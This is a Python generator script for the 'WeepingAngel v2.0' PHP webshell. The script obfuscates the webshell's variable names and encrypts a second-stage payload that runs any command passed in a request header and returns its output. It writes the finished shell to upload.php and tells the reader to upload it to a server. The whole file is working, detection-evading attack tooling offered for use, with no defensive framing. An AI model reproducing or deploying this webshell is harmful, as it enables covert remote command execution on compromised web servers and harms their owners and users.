# Name:        WeepingAngel v2.0
# Author:      Trisna Quebe
# Description:
# Version 2 of the WeepingAngel webshell.

#!/usr/bin/env python3
import random, string, os

# Default passphrase and init vector.
INIT_VECTOR = "6343151431231434"
PASSWORD = "BigPassword123!"

usePassword = input("Setup password: [leave blank for default password] ")
if len(usePassword) > 0:
    PASSWORD = usePassword

# All variables we need to obfuscate.
toObfuscate = [
    "NOTHING",
    "FUNCTION_NAME_DECODER", "TO_DECODE_NAME", "DECODED_NAME",
    "FN_STR_REPLACE", "STR_REPLACE",
    "FN_PRE_EXEC", "FN_EXEC", "EXEC",
    "EVAL_FOO", "FUNCTION_DATA",
    "FN_PRE_SSL_DEC", "FN_SSL_DEC", "OPENSSL_DECRYPT",
    "FN_PRE_BASE", "FN_BASE_DEC", "BASE64_DECODE",
    "FN_PRE_SUB", "FN_SUBSTR", "SUBSTR",
    "FN_PRE_USER_ID", "FN_USER_ID", "USER_TAG",
    "FN_PRE_AES", "FN_AES_METHOD", "AES_METHOD",
    "COMMAND", "OUTPUTARR", "RETVAL", "RESULTS",
    "PASSWORD", "INIT_VECTOR",
    "ENCRYPTED_PAYLOAD", "DECRYPTED_PAYLOAD"
]

stage2Payload = """
    $COMMAND = $_SERVER[$USER_TAG];
    if (strlen($COMMAND) == 0) {
        die();
    }
    $EXEC($COMMAND, $OUTPUTARR, $RETVAL);
    $RESULTS = (object) [
        'result' => $OUTPUTARR,
        'code' => $RETVAL
    ];

    echo json_encode($RESULTS);
"""

# Generate random strings.
def stringGenerator(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def randomIV():
    options = "0123456789"
    return ''.join(random.choice(options) for i in range(16))


# Stage 1 payload.
with open("./weepingAngel.php", "r") as reader:
    source_code = reader.read()

    # Change the IV and password to random.
    source_code = source_code.replace("1111222233334444", INIT_VECTOR)
    source_code = source_code.replace("PASSWORD_PLACEHOLDER", PASSWORD)

    for i in range(len(toObfuscate)):
        obfusVar = stringGenerator(len(toObfuscate[i]))
        source_code = source_code.replace(toObfuscate[i], obfusVar)
        stage2Payload = stage2Payload.replace(toObfuscate[i], obfusVar)

    #Stage 2 payload.
    with open("./stage2.bin", "w") as writer:
        writer.write(stage2Payload)
    
    # Now the PHP code needs to be run to encrypt the payload.
    output = os.popen("php ./encryptStage2.php " + 
        PASSWORD + " " + INIT_VECTOR).read()

    # Finally place the payload in the source code.
    source_code = source_code.replace("$PAYLOAD_PLACE", "\"" + output + "\"")

    with open("./upload.php", "w") as payload:
        payload.write(source_code)

    print("WeepingAngel webshell is generated in upload.php.")
    print("Upload this file to use the webshell!")
    
